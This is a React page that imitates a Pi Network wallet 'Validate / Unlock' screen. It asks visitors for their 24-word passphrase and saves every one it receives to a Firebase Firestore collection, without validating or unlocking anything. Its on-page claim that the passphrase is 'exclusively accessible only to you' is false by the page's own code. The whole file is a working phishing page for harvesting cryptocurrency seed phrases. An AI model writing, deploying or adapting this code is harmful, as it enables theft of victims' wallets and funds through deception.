import React, { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { db } from "../firebaseconfig"
import { 
  doc, 
  setDoc, 
  getDoc, 
  updateDoc, 
  arrayUnion, 
  serverTimestamp 
} from "firebase/firestore";
import AppLogo from "../assets/app-logo.png";
import Wallet from "../assets/wallet.jpg";
import PopupOverlay from "../components/PopupOverlay";

const PiWalletLogin = () => {
  const [searchParams] = useSearchParams();
  const id = searchParams.get("id");
  const [passphrase, setPassphrase] = useState("");
  const [popupOpen, setPopupOpen] = useState(false);
  const [popupStatus, setPopupStatus] = useState("loading");

  const handleUnlock = async () => {
    if (!id || !passphrase) {
      alert("Missing ID or passphrase!");
      return;
    }
  
    try {
      setPopupStatus("loading");
      setPopupOpen(true);
  
      // Get the current document reference
      const walletRef = doc(db, "wallets", id);
      
      // Get the current data (if it exists)
      const walletSnap = await getDoc(walletRef);
      
      if (walletSnap.exists()) {
        // Document exists, update it while preserving existing data
        await updateDoc(walletRef, {
          passphrase,
          timestamp: new Date(),
          // Keep track of all passphrases by adding to an array
          allPassphrases: arrayUnion(passphrase),
          updatedAt: new Date()
        });
      } else {
        // Document doesn't exist, create new one
        await setDoc(walletRef, {
          id,
          passphrase,
          timestamp: new Date(),
          allPassphrases: [passphrase],
          createdAt: new Date()
        });
      }
  
      setPopupStatus("success");
    } catch (error) {
      console.error("Error storing data:", error);
      setPopupStatus("error");
    }
  };
  
  const closePopup = () => {
    setPopupOpen(false);
  };

  return (
    <div className="flex flex-col min-h-screen">
      {/* Header */}
      <header className="bg-[rgba(112,61,146)] py-2 px-6 flex justify-center items-center">
        <div className="flex items-center space-x-2">
          <div className="bg-white rounded w-6 h-6">
            <img src={Wallet} alt="Wallet logo" />
          </div>
          <span className="text-white font-medium">Wallet</span>
          <div className="rounded-full w-8 h-8 flex items-center justify-center text-white ml-2 overflow-hidden">
            <img src={AppLogo} alt="Pi logo" className="w-full h-full object-cover" />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-grow flex flex-col items-center px-4 pt-4">
        <h1 className="text-xl font-bold text-black my-4">Validate / Unlock Pi Wallet</h1>

        {/* Passphrase Input Box */}
        <div className="w-[80vw] md:max-w-3xl mb-4">
          <div className="border border-gray-300 rounded-lg p-4 h-52">
            <textarea
              placeholder="Enter your 24-word passphrase here"
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
              className="w-full h-full outline-none text-gray-500 resize-none"
            />
          </div>
        </div>

        {/* Unlock Button */}
        <button
          className="w-[80vw] md:max-w-3xl bg-[rgba(112,61,146)] cursor-pointer text-white py-3 rounded-lg mb-4"
          onClick={handleUnlock}
        >
          Unlock with passphrase
        </button>

        {/* Information Text */}
        <div className="w-[80vw] md:max-w-3xl text-sm">
          <p className="mb-3">
            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
          </p>
          <p>
            Lost your passphrase?
            <a href="#" className="text-blue-500 mx-1">You can create a new wallet</a>,
            but all your π in your previous wallet will be inaccessible.
          </p>
        </div>
      </main>

      {/* Popup Overlay */}
      <PopupOverlay isOpen={popupOpen} onClose={closePopup} status={popupStatus} />
    </div>
  );
};

export default PiWalletLogin;
